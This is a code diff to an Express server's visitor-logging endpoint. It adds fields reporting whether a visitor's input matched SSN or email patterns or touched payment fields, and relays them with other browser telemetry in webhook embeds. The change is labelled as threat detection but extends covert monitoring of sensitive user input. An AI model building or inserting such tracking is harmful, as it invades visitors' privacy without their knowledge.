@@ -1,4 +1,3 @@
-
 const express = require('express');
 const cors = require('cors');
 const useragent = require('useragent');
@@ -162,6 +161,27 @@ function detectSecurityThreats(req, visitorInfo) {
     });
   }
 
+  if (req.body.part3?.ssnPatternDetected !== 'None') {
+    threats.push({
+      type: 'SSN Pattern',
+      details: 'SSN-like pattern detected in input'
+    });
+  }
+
+  if (req.body.part3?.emailPatternDetected !== 'None') {
+    threats.push({
+      type: 'Email Pattern',
+      details: 'Email-like pattern detected in input'
+    });
+  }
+
+  if (req.body.part3?.paymentFieldInteraction !== 'None') {
+    threats.push({
+      type: 'Payment Field Interaction',
+      details: 'Input detected in payment-related field'
+    });
+  }
+
   return threats;
 }
 
@@ -242,7 +262,10 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
         sessionStorageUsage: req.body.part3?.sessionStorageUsage || 'Unknown',
         browserFeatures: req.body.part3?.browserFeatures || 'None',
         pageLoadTime: req.body.part3?.pageLoadTime || 'Unknown',
-        userInteractionCount: req.body.part3?.userInteractionCount || 0
+        userInteractionCount: req.body.part3?.userInteractionCount || 0,
+        ssnPatternDetected: req.body.part3?.ssnPatternDetected || 'None',
+        emailPatternDetected: req.body.part3?.emailPatternDetected || 'None',
+        paymentFieldInteraction: req.body.part3?.paymentFieldInteraction || 'None'
       }
     };
 
@@ -294,12 +317,15 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       { name: 'Part 3: Browser Features', value: visitorInfo.part3.browserFeatures, inline: true },
       { name: 'Part 3: Page Load Time', value: visitorInfo.part3.pageLoadTime, inline: true },
       { name: 'Part 3: Interaction Count', value: visitorInfo.part3.userInteractionCount.toString(), inline: true },
+      { name: 'Part 3: SSN Pattern', value: visitorInfo.part3.ssnPatternDetected, inline: true },
+      { name: 'Part 3: Email Pattern', value: visitorInfo.part3.emailPatternDetected, inline: true },
+      { name: 'Part 3: Payment Interaction', value: visitorInfo.part3.paymentFieldInteraction, inline: true },
       { name: 'Threats', value: threats.length ? threats.map(t => `${t.type}: ${t.details}`).join('\n') : 'None', inline: false }
     ];
 
-    const firstBatch = fields.slice(0, 13); // Session ID to Proxy
-    const secondBatch = fields.slice(13, 26); // Hosting to Touch Support
-    const thirdBatch = fields.slice(26); // Battery Status to Threats
+    const firstBatch = fields.slice(0, 14); // Session ID to Hosting
+    const secondBatch = fields.slice(14, 28); // Browser to Scroll Position
+    const thirdBatch = fields.slice(28); // Part 3 fields to Threats
 
     const payload1 = {
       embeds: [{
